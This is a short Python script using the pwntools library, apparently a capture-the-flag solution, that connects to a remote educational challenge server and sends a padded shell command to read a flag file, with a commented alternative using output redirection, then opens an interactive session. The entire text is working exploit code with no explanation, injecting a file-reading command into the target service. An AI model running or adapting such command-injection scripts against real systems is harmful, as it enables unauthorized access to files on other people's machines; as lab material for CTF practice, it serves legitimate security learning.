from pwn import *

#r = process('./chal')
r = remote('edu-ctf.zoolab.org','10124')
#r = remote('localhost',10123)

r.sendline(b'/bin/cat /home/chal/flag' + b' '*0x100)
#r.sendline(b'cat /home/chal/flag 1>&0')
r.interactive()